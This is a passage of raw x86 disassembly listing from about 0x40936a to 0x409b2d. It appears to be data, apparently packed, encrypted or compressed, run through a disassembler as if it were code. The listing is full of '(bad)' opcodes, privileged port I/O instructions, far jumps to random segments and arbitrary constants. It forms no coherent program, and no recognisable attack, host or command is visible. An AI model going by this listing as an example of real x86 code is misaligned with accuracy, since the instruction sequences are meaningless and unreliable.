  40936a:	fld    TBYTE PTR [edx-0x3da4c902]
  409370:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409371:	mov    ds:0x314af90b,eax
  409376:	mov    eax,ds:0x267ff5d3
  40937b:	adc    eax,ebp
  40937d:	mov    ch,0x21
  40937f:	dec    ebx
  409380:	pop    edx
  409381:	mov    ecx,0xb5c0bdfa
  409386:	mov    DWORD PTR [edi],edi
  409388:	or     DWORD PTR [ecx],esp
  40938a:	sbb    al,0xda
  40938c:	jge    0x4093c8
  40938e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40938f:	sub    DWORD PTR [esi+0x27],0x69f58616
  409396:	dec    ecx
  409397:	dec    ebp
  409398:	sbb    bl,dl
  40939a:	xlat   BYTE PTR ds:[ebx]
  40939b:	fld    QWORD PTR [edi-0x22]
  40939e:	stc    
  40939f:	cli    
  4093a0:	xchg   esp,eax
  4093a1:	test   al,0x60
  4093a3:	scas   al,BYTE PTR es:[edi]
  4093a4:	dec    edx
  4093a5:	mov    ah,0xc6
  4093a7:	or     al,0x42
  4093a9:	mov    BYTE PTR [esi],dh
  4093ab:	mov    bh,BYTE PTR [ebx+ebp*1-0x77]
  4093af:	adc    cl,bh
  4093b1:	ret    
  4093b2:	(bad)  
  4093b3:	out    dx,al
  4093b4:	outs   dx,BYTE PTR ds:[esi]
  4093b5:	retf   
  4093b6:	pop    es
  4093b7:	imul   ecx,DWORD PTR [ebx+0x55],0xffffffb9
  4093bb:	lea    ebx,[edx+0x1c08b39d]
  4093c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093c2:	jnp    0x409394
  4093c4:	cmp    ecx,0x219193d0
  4093ca:	jp     0x4093c5
  4093cc:	pop    ds
  4093cd:	pop    esp
  4093ce:	repz scas al,BYTE PTR es:[edi]
  4093d0:	cmp    al,0x5c
  4093d2:	jmp    0x4093fe
  4093d4:	sbb    ebx,DWORD PTR [eax]
  4093d6:	inc    eax
  4093d7:	xchg   ecx,eax
  4093d8:	jnp    0x4093ea
  4093da:	(bad)  
  4093db:	cwde   
  4093dc:	pop    esp
  4093dd:	jle    0x409427
  4093df:	ins    BYTE PTR es:[edi],dx
  4093e0:	mov    esi,0x310056d3
  4093e5:	mov    edx,0x8af35e26
  4093ea:	out    dx,eax
  4093eb:	cli    
  4093ec:	cmp    dl,bl
  4093ee:	ja     0x40938d
  4093f0:	jmp    0x40940b
  4093f2:	(bad)  
  4093f3:	idiv   bh
  4093f5:	lds    ebp,FWORD PTR [edi+ebp*2+0x16d5bb50]
  4093fc:	bound  esi,QWORD PTR [eax+0x40f8476c]
  409402:	shl    edx,1
  409404:	or     dh,BYTE PTR [ecx-0x78]
  409407:	(bad)  
  409408:	das    
  409409:	cs ss iret 
  40940c:	shl    DWORD PTR [edx-0x7c],cl
  40940f:	push   ecx
  409410:	adc    BYTE PTR [edi],al
  409412:	or     eax,0x4ccc1eca
  409417:	sahf   
  409418:	xchg   esp,eax
  409419:	sbb    DWORD PTR [esi+0x5aee6faa],ebx
  40941f:	xor    BYTE PTR [ebx+eax*4],cl
  409422:	cdq    
  409423:	bound  ebx,QWORD PTR [ebx+0x509ff2c9]
  409429:	mov    ebp,0x78a3cc8d
  40942e:	or     eax,0xc7232bcc
  409433:	cli    
  409434:	out    0x7e,al
  409436:	mov    ebx,0x98b369d3
  40943b:	adc    BYTE PTR [ecx+esi*8+0x5517886b],cl
  409442:	cwde   
  409443:	ror    esp,1
  409445:	cs or  eax,0x6af0445a
  40944b:	push   esp
  40944c:	jle    0x40945e
  40944e:	stos   DWORD PTR es:[edi],eax
  40944f:	sub    al,0x6f
  409451:	dec    ecx
  409452:	not    dl
  409454:	mov    cs,WORD PTR [eax]
  409456:	and    eax,0x7b804937
  40945b:	adc    eax,0xda9fed68
  409460:	pop    ss
  409461:	call   0x77eb1c5e
  409466:	jne    0x4094a2
  409468:	popf   
  409469:	sbb    bl,al
  40946b:	or     cl,BYTE PTR [edi+0x16ad9bfd]
  409471:	sbb    DWORD PTR [esp+ecx*2+0x37],ecx
  409475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409476:	cmc    
  409477:	xor    BYTE PTR [edi+0x3c],cl
  40947a:	rcl    BYTE PTR [esp+ebx*4+0x5d],cl
  40947e:	inc    ebp
  40947f:	or     dl,BYTE PTR [ecx+edi*1-0x6b089fa0]
  409486:	dec    edi
  409487:	in     al,dx
  409488:	push   cs
  409489:	scas   al,BYTE PTR es:[edi]
  40948a:	or     esi,DWORD PTR [eax-0x35]
  40948d:	pop    ds
  40948e:	jge    0x40943f
  409490:	jmp    0x3290c9b2
  409495:	jae    0x409503
  409497:	sub    eax,0xf7405168
  40949c:	xchg   esi,edx
  40949e:	and    al,0xbc
  4094a0:	fmul   DWORD PTR [ecx+ecx*1+0x3d5f772a]
  4094a7:	push   0x15
  4094a9:	add    al,0x23
  4094ab:	pop    ecx
  4094ac:	push   ss
  4094ad:	pop    edx
  4094ae:	ss je  0x40943c
  4094b1:	add    al,0x91
  4094b3:	mov    ds:0x32eecdc6,eax
  4094b8:	ror    BYTE PTR [edi+0x33],1
  4094bb:	call   0x8976:0x2c27d986
  4094c2:	pusha  
  4094c3:	and    cl,BYTE PTR [ecx+ebp*2-0x5f]
  4094c7:	icebp  
  4094c8:	loop   0x40950f
  4094ca:	mov    al,ds:0x268b8bf0
  4094cf:	mov    ah,0x73
  4094d1:	out    dx,al
  4094d2:	aad    0x6e
  4094d4:	xchg   esp,eax
  4094d5:	(bad)  
  4094d6:	call   0xa786d04d
  4094db:	inc    ebp
  4094dc:	adc    bl,dl
  4094de:	or     bh,BYTE PTR [ecx+ebx*1]
  4094e1:	bswap  edi
  4094e3:	outs   dx,BYTE PTR ds:[esi]
  4094e4:	jp     0x4094f7
  4094e6:	push   esp
  4094e7:	mov    esp,0x9d7a5f79
  4094ec:	xchg   edx,eax
  4094ed:	adc    cl,ah
  4094ef:	mov    bh,0x26
  4094f1:	xchg   ebx,eax
  4094f2:	lds    edi,FWORD PTR [esi+0x3b]
  4094f5:	jge    0x4094f6
  4094f7:	inc    ebx
  4094f8:	or     ah,BYTE PTR ds:0x64e2eb0c
  4094fe:	stos   BYTE PTR es:[edi],al
  4094ff:	inc    edi
  409500:	push   0x3a
  409502:	fs ret 0xda64
  409506:	cmp    eax,0xce2a1222
  40950b:	pusha  
  40950c:	push   edx
  40950d:	(bad)  
  40950e:	(bad)  
  409510:	jnp    0x4094ed
  409512:	mov    bh,0x95
  409514:	sbb    DWORD PTR [ecx+0x100bd9e],esi
  40951a:	mov    al,0xcf
  40951c:	int    0xdd
  40951e:	stos   BYTE PTR es:[edi],al
  40951f:	inc    edi
  409520:	outs   dx,BYTE PTR ds:[esi]
  409521:	xor    al,0xcd
  409523:	ja     0x40956e
  409525:	xchg   esp,eax
  409526:	fdivrp st(1),st
  409528:	out    0x2d,eax
  40952a:	xchg   ebp,eax
  40952b:	mov    edx,0x74085104
  409530:	xchg   ebx,eax
  409531:	jbe    0x409589
  409533:	prefetch BYTE PTR es:[edx-0x62]
  409538:	clc    
  409539:	jns    0x409505
  40953b:	ss mov ecx,0x9c0c6468
  409541:	sti    
  409542:	inc    ebp
  409543:	lock cmp bh,BYTE PTR [ebx]
  409546:	push   esi
  409547:	dec    esp
  409548:	std    
  409549:	inc    edi
  40954a:	in     eax,0x59
  40954c:	pop    eax
  40954d:	adc    eax,0x2b97fe70
  409552:	dec    ebx
  409553:	dec    ebx
  409554:	call   0x7872:0x685770e3
  40955b:	(bad)  
  40955c:	pop    esi
  40955d:	adc    ebp,DWORD PTR [edi]
  40955f:	mov    edx,0x8b725eeb
  409564:	mov    al,0xd9
  409566:	or     DWORD PTR [edx+0x4c],ebp
  409569:	retf   0xd4b8
  40956c:	dec    ebp
  40956d:	mov    DWORD PTR [esi],ecx
  40956f:	inc    esi
  409570:	add    BYTE PTR [esi],dh
  409572:	mov    edi,0x32948711
  409577:	in     eax,0x17
  409579:	push   0xffffffed
  40957b:	pop    ebp
  40957c:	in     eax,0xea
  40957e:	push   0xfffffff3
  409580:	xchg   esp,eax
  409581:	jnp    0x4095f5
  409583:	or     BYTE PTR [edx],cl
  409585:	rol    DWORD PTR [edx-0x70cc8450],0x9e
  40958c:	and    DWORD PTR [eax-0x6468d754],esi
  409592:	dec    edx
  409593:	or     esp,eax
  409595:	imul   edx,DWORD PTR [esi-0x8],0x42
  409599:	cmp    eax,0xd6521c44
  40959e:	ins    BYTE PTR es:[edi],dx
  40959f:	pop    esi
  4095a0:	shl    BYTE PTR [edi-0x4451fc90],1
  4095a6:	inc    edi
  4095a7:	inc    edi
  4095a8:	aam    0xe4
  4095aa:	shr    cl,0x87
  4095ad:	in     al,dx
  4095ae:	sub    dl,dl
  4095b0:	out    dx,eax
  4095b1:	sub    BYTE PTR [esi],ch
  4095b3:	shl    BYTE PTR [edi-0x71],1
  4095b6:	push   cs
  4095b7:	push   ds
  4095b8:	in     al,0xc5
  4095ba:	js     0x4095bb
  4095bc:	into   
  4095bd:	jnp    0x409567
  4095bf:	pop    es
  4095c0:	(bad)  
  4095c1:	cmp    BYTE PTR [esi],bh
  4095c3:	(bad)  
  4095c5:	mov    WORD PTR [esi+0x2a],cs
  4095c8:	add    dh,ch
  4095ca:	mov    eax,ds:0x4136230f
  4095cf:	dec    ebp
  4095d0:	xchg   BYTE PTR [edx+eiz*1],ch
  4095d3:	(bad)  
  4095d4:	test   al,0x29
  4095d6:	aaa    
  4095d7:	out    0xf3,eax
  4095d9:	sti    
  4095da:	sbb    eax,0x2d86656e
  4095df:	lds    eax,FWORD PTR [edi]
  4095e1:	sbb    eax,edx
  4095e3:	cli    
  4095e4:	int    0xf0
  4095e6:	ret    
  4095e7:	fs mov ebx,0x6b098ea5
  4095ed:	xlat   BYTE PTR ds:[ebx]
  4095ee:	div    cl
  4095f0:	sti    
  4095f1:	xchg   edx,eax
  4095f2:	sti    
  4095f3:	loopne 0x40960c
  4095f5:	push   cs
  4095f6:	lahf   
  4095f7:	dec    esp
  4095f8:	sub    edx,ebx
  4095fa:	mov    al,0xf0
  4095fc:	pop    edi
  4095fd:	aam    0x8
  4095ff:	sbb    DWORD PTR [esi-0x22],esp
  409602:	xlat   BYTE PTR ds:[ebx]
  409603:	cmp    DWORD PTR [ebx+esi*4-0x4a1840a8],ebp
  40960a:	scas   al,BYTE PTR es:[edi]
  40960b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40960c:	mov    esi,0xc517a4a2
  409611:	sub    eax,0xbeec5924
  409616:	push   edi
  409617:	push   eax
  409618:	mov    fs,WORD PTR [ecx-0x5601a051]
  40961e:	pop    edi
  40961f:	daa    
  409620:	xchg   esi,eax
  409621:	aaa    
  409622:	jne    0x4095f2
  409624:	jmp    0xf7e8:0xa095174f
  40962b:	out    dx,al
  40962c:	mov    ecx,0xa456da0e
  409631:	sbb    esp,ebp
  409633:	adc    ah,BYTE PTR [eax]
  409635:	jecxz  0x40968c
  409637:	jmp    0x913d:0x5e516192
  40963e:	clc    
  40963f:	and    eax,DWORD PTR [esi+0x5458034]
  409645:	fwait
  409646:	outs   dx,BYTE PTR ds:[esi]
  409647:	call   0x867cd341
  40964c:	shl    dh,1
  40964e:	jl     0x409651
  409650:	ss lahf 
  409652:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409653:	push   0x62c4df14
  409658:	adc    ebp,DWORD PTR [ebx-0x14]
  40965b:	xor    BYTE PTR [esi+esi*8+0x3b],bl
  40965f:	jmp    0xb2b9743c
  409664:	out    0x9f,al
  409666:	and    esi,eax
  409668:	inc    edi
  409669:	or     ch,BYTE PTR [ebx+0x30]
  40966c:	and    al,0x13
  40966e:	xlat   BYTE PTR ds:[ebx]
  40966f:	jge    0x409696
  409671:	mov    esp,0xbca2579
  409676:	sar    BYTE PTR [edi+0x64d0a0eb],1
  40967c:	cmp    al,0x96
  40967e:	push   edx
  40967f:	inc    ecx
  409680:	xlat   BYTE PTR ds:[ebx]
  409681:	pushf  
  409682:	mov    ds:0x7e89a830,al
  409687:	and    al,0xae
  409689:	clc    
  40968a:	js     0x40968c
  40968c:	push   0x3
  40968e:	dec    edi
  40968f:	sbb    al,0x41
  409691:	mov    ecx,0x47c8e1c5
  409696:	mov    ecx,0x10b23077
  40969b:	jp     0x4096a9
  40969d:	or     BYTE PTR [ecx],0x57
  4096a0:	mov    ecx,0x47777b60
  4096a5:	and    DWORD PTR [ebp+0x53e8310a],eax
  4096ab:	sar    DWORD PTR [ebx],1
  4096ad:	outs   dx,BYTE PTR ds:[esi]
  4096ae:	dec    esp
  4096af:	and    eax,edx
  4096b1:	pop    ebp
  4096b2:	cdq    
  4096b3:	xchg   ebp,eax
  4096b4:	sbb    BYTE PTR ds:0x976c5bb6,0x86
  4096bb:	jmp    DWORD PTR [ebx+0x43]
  4096be:	int    0xae
  4096c0:	xchg   BYTE PTR [edi+0x2f1c9736],al
  4096c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096c7:	add    dh,ch
  4096c9:	out    dx,eax
  4096ca:	mov    WORD PTR [ebx+0x73],?
  4096cd:	fwait
  4096ce:	dec    eax
  4096cf:	push   edi
  4096d0:	test   eax,0x5886a2c8
  4096d5:	js     0x409745
  4096d7:	daa    
  4096d8:	xchg   bh,cl
  4096da:	add    esi,esp
  4096dc:	mov    dh,BYTE PTR [esi-0x3b]
  4096df:	sub    al,0xfb
  4096e1:	sub    DWORD PTR [edx+0x47],ecx
  4096e4:	mov    ebp,0x1bad5fc2
  4096e9:	or     al,0xc0
  4096eb:	shl    edi,0xe7
  4096ee:	ror    ch,0x64
  4096f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096f2:	xor    al,0x4e
  4096f4:	mov    DWORD PTR [ebp-0x39],0xb983de1
  4096fb:	inc    ecx
  4096fc:	imul   ecx,DWORD PTR [ecx+0x298ca226],0x9dae832b
  409706:	xor    BYTE PTR [ebp+0x41],bh
  409709:	out    dx,al
  40970a:	(bad)  
  40970b:	into   
  40970c:	jmp    0xbc23:0xc9b6c13c
  409713:	xchg   esp,eax
  409714:	mov    ecx,0x8bf90994
  409719:	and    al,0xdb
  40971b:	int    0x24
  40971d:	push   0xffffff9f
  40971f:	call   0xf60a1f4a
  409724:	sbb    eax,0x4ca1d0cf
  409729:	or     DWORD PTR [esp+eax*8+0x5e],ebx
  40972d:	mov    ecx,0x7f7e554b
  409732:	mov    cl,0xe
  409734:	sub    BYTE PTR [edi+edi*8-0x54],ch
  409738:	dec    esp
  409739:	pop    ss
  40973a:	mov    cl,0x41
  40973c:	adc    al,0x53
  40973e:	mov    ds:0x9686bc10,al
  409743:	add    BYTE PTR [ebx],cl
  409745:	fdivr  st,st(3)
  409747:	pop    ss
  409748:	fmul   QWORD PTR [ecx]
  40974a:	push   ax
  40974c:	lea    ebx,[ebx+0x23]
  40974f:	inc    edx
  409750:	inc    eax
  409751:	push   eax
  409752:	mov    ah,0x24
  409754:	stos   DWORD PTR es:[edi],eax
  409755:	mov    esp,0x21aabd7f
  40975a:	rcr    dl,1
  40975c:	sub    bh,BYTE PTR [ebp-0x2]
  40975f:	outs   dx,BYTE PTR ds:[esi]
  409760:	or     esp,0xebcfc66
  409766:	dec    ecx
  409767:	jg     0x409713
  409769:	add    ah,al
  40976b:	xor    BYTE PTR [edx-0x1c],bl
  40976e:	mov    eax,0x4443bc4
  409773:	cdq    
  409774:	jp     0x409784
  409776:	push   DWORD PTR [edx-0xd]
  409779:	jl     0x409770
  40977b:	in     eax,dx
  40977c:	out    dx,al
  40977d:	lock sub BYTE PTR [ebp-0x2cdab8c9],al
  409784:	jp     0x409712
  409786:	mov    BYTE PTR [ecx],al
  409788:	sub    eax,0xa5244ab4
  40978d:	and    BYTE PTR [esp+edi*1],dh
  409790:	aas    
  409791:	mov    edx,0xf9010c0e
  409796:	jnp    0x4097a1
  409798:	xchg   ebx,eax
  409799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40979a:	fcmovbe st,st(2)
  40979c:	sub    BYTE PTR [edx+esi*8-0x1f9357a9],al
  4097a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097a4:	add    ebp,ebp
  4097a6:	(bad)  
  4097a8:	leave  
  4097a9:	sub    DWORD PTR [ebp-0x357eda79],esi
  4097af:	push   ecx
  4097b0:	cli    
  4097b1:	repnz pop ebp
  4097b3:	or     esi,DWORD PTR [ebx+edi*4]
  4097b6:	adc    eax,0x29a56a6c
  4097bb:	add    eax,0xc7e350b5
  4097c0:	push   eax
  4097c1:	dec    eax
  4097c2:	das    
  4097c3:	es dec ebp
  4097c5:	fisttp QWORD PTR [esi+0x11]
  4097c8:	mov    ecx,0x9acaa175
  4097cd:	shr    BYTE PTR ds:0x710ca047,1
  4097d3:	inc    eax
  4097d4:	imul   esi,DWORD PTR [ebp-0x24],0x3c
  4097d8:	(bad)  
  4097d9:	and    al,bh
  4097db:	ds jae 0x409790
  4097de:	scas   al,BYTE PTR es:[edi]
  4097df:	inc    ecx
  4097e0:	aam    0x20
  4097e2:	ds aaa 
  4097e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097e5:	and    eax,0x489ced50
  4097ea:	xchg   edi,eax
  4097eb:	jae    0x4097cf
  4097ed:	push   esp
  4097ee:	push   esp
  4097ef:	(bad)  
  4097f0:	cmp    eax,0x7d16c17b
  4097f5:	jmp    0x11e8cc99
  4097fa:	stos   BYTE PTR es:[edi],al
  4097fb:	add    al,0x43
  4097fd:	aaa    
  4097fe:	outs   dx,DWORD PTR ds:[esi]
  4097ff:	jecxz  0x40984f
  409801:	jecxz  0x40985a
  409803:	or     eax,0x4e2c59f
  409808:	inc    esi
  409809:	fist   WORD PTR [esi-0x4f291016]
  40980f:	pop    ebp
  409810:	test   BYTE PTR [esi+0x55],cl
  409813:	aad    0x15
  409815:	sub    dh,BYTE PTR [ebp+ebp*4-0x136e2611]
  40981c:	pop    eax
  40981d:	ins    BYTE PTR es:[edi],dx
  40981e:	pop    esp
  40981f:	out    0x46,eax
  409821:	jbe    0x40983a
  409823:	stc    
  409824:	sahf   
  409825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409826:	(bad)  
  409827:	mov    edx,0x6006cb31
  40982c:	fadd   DWORD PTR [esi-0x18]
  40982f:	pop    esp
  409830:	(bad)  
  409831:	mov    ebp,0xa48d54f9
  409836:	sub    BYTE PTR [eax+0x76],0x16
  40983a:	mov    esp,0xca63b2c0
  40983f:	or     eax,0x2ca3dc34
  409844:	(bad)  
  409845:	sub    ebp,DWORD PTR [edx+0xbaa270c]
  40984b:	push   0xabd227fa
  409850:	or     bl,BYTE PTR [edi+eiz*2]
  409853:	push   0xf79e9c5f
  409858:	xchg   ah,dl
  40985a:	loop   0x4098d4
  40985c:	or     al,0xba
  40985e:	adc    al,al
  409860:	call   0x4053b4be
  409865:	daa    
  409866:	mov    ds:0x4ba0643a,eax
  40986b:	adc    edi,DWORD PTR [edi+0x1733c584]
  409871:	dec    eax
  409872:	add    DWORD PTR [esi+0x6caf9261],esp
  409878:	xor    edx,edi
  40987a:	retf   
  40987b:	cmp    al,0xdc
  40987d:	and    ebp,DWORD PTR [edx]
  40987f:	scas   al,BYTE PTR es:[edi]
  409880:	imul   eax,eax,0x8805c48a
  409886:	leave  
  409887:	xor    dl,cl
  409889:	push   esp
  40988a:	lea    edx,[ebx+0x930a3a0]
  409890:	jecxz  0x409906
  409892:	stos   BYTE PTR es:[edi],al
  409893:	inc    esp
  409894:	mov    ds:0x3a295f2a,al
  409899:	(bad)  
  40989a:	pop    ebp
  40989b:	fdivr  DWORD PTR [ecx+0x47a34b1]
  4098a1:	enter  0x4a9,0xee
  4098a5:	push   es
  4098a6:	xchg   ebx,eax
  4098a7:	rcl    BYTE PTR [esi+0x73],1
  4098aa:	ins    DWORD PTR es:[edi],dx
  4098ab:	fcom   DWORD PTR [eax]
  4098ad:	ins    DWORD PTR es:[edi],dx
  4098ae:	add    BYTE PTR [edx],0x9c
  4098b1:	mov    gs,WORD PTR [ebx]
  4098b3:	scas   eax,DWORD PTR es:[edi]
  4098b4:	cmp    ebp,edx
  4098b6:	out    0xdb,al
  4098b8:	xor    DWORD PTR [ebp-0x932add5],edi
  4098be:	cwde   
  4098bf:	mov    eax,ds:0x1a15bee4
  4098c4:	push   esp
  4098c5:	nop
  4098c6:	add    al,0x30
  4098c8:	and    ebx,DWORD PTR [esi-0x31]
  4098cb:	cmp    DWORD PTR [edi-0x5e],ecx
  4098ce:	call   FWORD PTR [edi]
  4098d0:	hlt    
  4098d1:	arpl   WORD PTR [ebp-0x61],si
  4098d4:	mov    al,0x8d
  4098d6:	push   edi
  4098d7:	(bad)  
  4098d8:	xchg   edi,eax
  4098d9:	sbb    BYTE PTR [ecx+ebp*4-0x5],0x6c
  4098de:	mov    dh,0x8e
  4098e0:	xchg   ecx,eax
  4098e1:	div    al
  4098e3:	gs scas al,BYTE PTR es:[edi]
  4098e5:	jmp    0x1f761b53
  4098ea:	nop
  4098eb:	dec    ebp
  4098ec:	rcr    ecx,1
  4098ee:	in     eax,0x34
  4098f0:	ret    
  4098f1:	sub    eax,0xcafe91a1
  4098f6:	aam    0x4c
  4098f8:	(bad)
  4098fc:	in     al,dx
  4098fd:	xchg   edx,eax
  4098fe:	mov    edx,0xd1b1b72
  409903:	(bad)  
  409904:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409905:	xchg   edi,eax
  409906:	into   
  409907:	enter  0xf5b2,0x7f
  40990b:	dec    esp
  40990c:	scas   eax,DWORD PTR es:[edi]
  40990d:	ja     0x409925
  40990f:	loope  0x40991c
  409911:	sub    bh,al
  409913:	inc    edx
  409914:	add    BYTE PTR [eax+eax*2-0xf1c7c02],ch
  40991b:	mov    al,BYTE PTR [esi+edi*4+0x44]
  40991f:	mov    ds:0x12dc0c64,al
  409924:	ror    BYTE PTR [ecx],1
  409926:	mov    dl,0xaa
  409928:	dec    edi
  409929:	jl     0x4099a4
  40992b:	es and esp,ebp
  40992e:	sub    eax,0x191f1e5f
  409933:	out    0x5e,eax
  409935:	dec    esp
  409936:	xchg   ecx,eax
  409937:	mov    al,ds:0x2baed016
  40993c:	jno    0x4098cb
  40993e:	sub    al,0xcd
  409940:	outs   dx,DWORD PTR cs:[esi]
  409942:	sub    al,0x7c
  409944:	scas   al,BYTE PTR es:[edi]
  409945:	(bad)  
  409946:	jnp    0x40998a
  409948:	xchg   edx,eax
  409949:	mov    esi,0x87e4bbb4
  40994e:	clc    
  40994f:	jmp    0x4098f9
  409951:	jp     0x409919
  409953:	outs   dx,DWORD PTR ds:[esi]
  409954:	sar    ebp,cl
  409956:	rcl    BYTE PTR [ebx],1
  409958:	and    al,0x18
  40995a:	mov    eax,ds:0xd8d1b91b
  40995f:	add    BYTE PTR [ebx-0x78241f7d],0x74
  409966:	(bad)  
  409967:	(bad)  
  409968:	sbb    eax,0x831bb077
  40996d:	lea    eax,[ebp*4-0x16c84297]
  409974:	js     0x409935
  409976:	jp     0x40994b
  409978:	or     eax,0x4beb9c9b
  40997d:	mov    al,ds:0x4691ffc8
  409982:	dec    esp
  409983:	sub    edx,DWORD PTR [ebp+0x7d]
  409986:	aas    
  409987:	dec    ebp
  409988:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409989:	pop    edx
  40998a:	xchg   edi,eax
  40998b:	mov    gs,WORD PTR [eax+0x73c744b6]
  409991:	and    BYTE PTR [ecx+0x2b],cl
  409994:	and    BYTE PTR [ecx],bl
  409996:	push   cs
  409997:	test   al,0x5e
  409999:	cmp    DWORD PTR [ecx+0x1e3e3320],0xffffffb6
  4099a0:	fstp   TBYTE PTR [edi]
  4099a2:	mov    bl,0x1e
  4099a4:	call   0x55c2:0xab74d6a3
  4099ab:	retf   0x4024
  4099ae:	leave  
  4099af:	pop    eax
  4099b0:	mov    ecx,0x3ef54931
  4099b5:	adc    ebp,edi
  4099b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4099b8:	out    dx,eax
  4099b9:	fs aad 0x2d
  4099bc:	push   ss
  4099bd:	jae    0x409968
  4099bf:	jle    0x40998e
  4099c1:	icebp  
  4099c2:	les    edx,FWORD PTR [esi+0x1f7efe9d]
  4099c8:	pushf  
  4099c9:	push   ebp
  4099ca:	into   
  4099cb:	inc    ebx
  4099cc:	adc    eax,0x3b23b235
  4099d1:	pop    ebp
  4099d2:	clc    
  4099d3:	stos   DWORD PTR es:[edi],eax
  4099d4:	lock dec edi
  4099d6:	inc    edi
  4099d7:	push   0x484dc782
  4099dc:	test   BYTE PTR [esi],ch
  4099de:	jae    0x4099fa
  4099e0:	sar    DWORD PTR ss:[eax-0x28],0xd1
  4099e5:	gs es and al,0xee
  4099e9:	ret    
  4099ea:	out    dx,eax
  4099eb:	test   eax,0xf9d26013
  4099f0:	shl    BYTE PTR [eax],0x7f
  4099f3:	inc    esi
  4099f4:	mov    ds,WORD PTR [eax]
  4099f6:	les    ecx,FWORD PTR [eax]
  4099f8:	rol    BYTE PTR [ebx+ebx*8-0x6e],1
  4099fc:	ja     0x409996
  4099fe:	mov    eax,ds:0xa6ef6b65
  409a03:	mov    esp,0xbd94f4c1
  409a08:	and    edi,edx
  409a0a:	add    dh,BYTE PTR [edx]
  409a0c:	loopne 0x409a0f
  409a0e:	pop    esp
  409a0f:	jmp    DWORD PTR [ebx+esi*1]
  409a12:	inc    ebp
  409a13:	(bad)  
  409a14:	scas   al,BYTE PTR es:[edi]
  409a15:	xor    ebp,esp
  409a17:	fisttp QWORD PTR [edx-0x4dbcc1f3]
  409a1d:	inc    edi
  409a1e:	sahf   
  409a1f:	es mov edx,eax
  409a22:	adc    eax,0x569604ee
  409a27:	xor    edx,esp
  409a29:	mov    DWORD PTR [esp+esi*1-0x42],esi
  409a2d:	(bad)  
  409a2e:	loope  0x409a30
  409a30:	sub    BYTE PTR [ebp+0x24],ch
  409a33:	arpl   ax,cx
  409a35:	sub    al,0x42
  409a37:	in     eax,dx
  409a38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a39:	push   edx
  409a3a:	sar    BYTE PTR [ecx+edi*2-0x395dd641],1
  409a41:	lods   eax,DWORD PTR ds:[esi]
  409a42:	shl    BYTE PTR [esi+edx*2+0x1b7e4eca],0x4d
  409a4a:	loope  0x409a3d
  409a4c:	or     al,BYTE PTR [edx+0x4514d4b8]
  409a52:	or     eax,0x6c5e8fd1
  409a57:	jmp    0x409ab4
  409a59:	mov    ch,0xd4
  409a5b:	std    
  409a5c:	repz push es
  409a5e:	ds das 
  409a60:	xchg   esi,eax
  409a61:	mov    al,ds:0x53c639ec
  409a66:	add    edx,DWORD PTR [edx]
  409a68:	or     edx,DWORD PTR [edx-0x545d4d9e]
  409a6e:	mov    esp,0x556eafd8
  409a73:	fldenv [edi+0x4c]
  409a76:	ja     0x409a0a
  409a78:	dec    BYTE PTR [ebp+edx*4-0x31]
  409a7c:	loope  0x409ad7
  409a7e:	sub    al,0x28
  409a80:	adc    DWORD PTR [edx],0x65
  409a83:	xor    DWORD PTR [ecx+ebp*4-0x80],edx
  409a87:	pop    edx
  409a88:	iret   
  409a89:	mov    bh,0xf7
  409a8b:	jp     0x409add
  409a8d:	jg     0x409b0b
  409a8f:	adc    eax,0x4d5a67a5
  409a94:	add    dl,BYTE PTR [ebx+edi*1-0x1b778000]
  409a9b:	and    esi,DWORD PTR [ecx-0x32cbe98b]
  409aa1:	pushf  
  409aa2:	add    dh,BYTE PTR es:[esi+ebx*1-0x7a428e59]
  409aaa:	fidiv  WORD PTR [ecx]
  409aac:	outs   dx,BYTE PTR ds:[esi]
  409aad:	pop    ebp
  409aae:	cmp    esi,DWORD PTR [esi]
  409ab0:	loopne 0x409a94
  409ab2:	or     BYTE PTR [edx],cl
  409ab4:	push   esi
  409ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ab6:	arpl   ax,bp
  409ab8:	ins    BYTE PTR es:[edi],dx
  409ab9:	inc    ecx
  409aba:	rcr    DWORD PTR [ecx],cl
  409abc:	ror    ebp,cl
  409abe:	push   0xceab0b77
  409ac3:	mov    ebx,edx
  409ac5:	and    eax,0xf82a6fa0
  409acb:	push   ecx
  409acc:	push   ds
  409acd:	mov    bl,0x3c
  409acf:	out    0x27,eax
  409ad1:	jns    0x409b23
  409ad3:	xchg   esi,eax
  409ad4:	jmp    0xca38:0x22e1c927
  409adb:	ror    al,1
  409add:	int    0xbf
  409adf:	loope  0x409b0e
  409ae1:	aaa    
  409ae2:	jbe    0x409ae9
  409ae4:	and    eax,0xa325863a
  409ae9:	dec    ebx
  409aea:	jmp    0x9b9f5739
  409aef:	cmp    al,0xc7
  409af1:	jbe    0x409b0e
  409af3:	cmc    
  409af4:	adc    al,dl
  409af6:	mov    al,BYTE PTR [edx-0x6b]
  409af9:	imul   edi,DWORD PTR [edx+0x361fd5dc],0x322ce7a6
  409b03:	sub    al,0xb9
  409b05:	jge    0x409b73
  409b07:	or     al,0x6d
  409b09:	mov    ds:0xc371f513,al
  409b0e:	scas   al,BYTE PTR es:[edi]
  409b0f:	push   0x78
  409b11:	shl    DWORD PTR [esi],cl
  409b13:	test   eax,0x30259a48
  409b18:	sbb    eax,0x31bd9951
  409b1d:	xchg   BYTE PTR [ebx+eiz*2],dl
  409b20:	mov    edx,0xfeea4db8
  409b25:	out    dx,al
  409b26:	aaa    
  409b27:	and    BYTE PTR [ecx+0x6f],dl
  409b2a:	inc    edx
  409b2b:	cmp    DWORD PTR [esi],esi
  409b2d:	jbe    0x409b45
